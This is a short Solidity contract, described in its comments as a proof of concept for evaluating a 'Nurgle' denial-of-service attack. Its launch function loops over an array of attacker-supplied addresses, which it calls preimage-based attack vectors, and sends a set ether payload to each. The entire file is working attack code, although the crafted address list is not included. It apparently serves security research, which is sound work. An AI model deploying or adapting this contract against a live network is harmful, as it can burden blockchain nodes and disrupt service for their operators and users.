pragma solidity ^0.4.11;
 
//The implementation of the contract is used for Nurgle attack PoC Evaluation.
contract DoSPoCEvaluation{

  uint256 payload;//PoC parameter (i.e., the value of ether)

  //The constructor sets the default parameters of the attack payload
  function DoSPoCEvaluation() payable { 
      payload=1;
  }

 
  function() payable{}
 
  //Seting the default parameters of the attack payload
  //** Param represents the value of ether.
  function SetPayload(uint256 Param) {
      payload = Param;
  }
  
  //PoC evaluation launching function of Nurgle attack
  //** ParamPoCvectors represents the attack vectors composed by a series of preimages.
  function DoSPoCLaunch(address[] ParamPoCvectors)  payable public returns (bool) {
          uint256 vectorlength = ParamPoCvectors.length;
		  for(uint256 i=0; i < vectorlength; i++){
			   bool result=ParamPoCvectors[i].send(payload);
			   if(result==false){
				 return false;
			   }
		  } 
		 return true;
	 }
}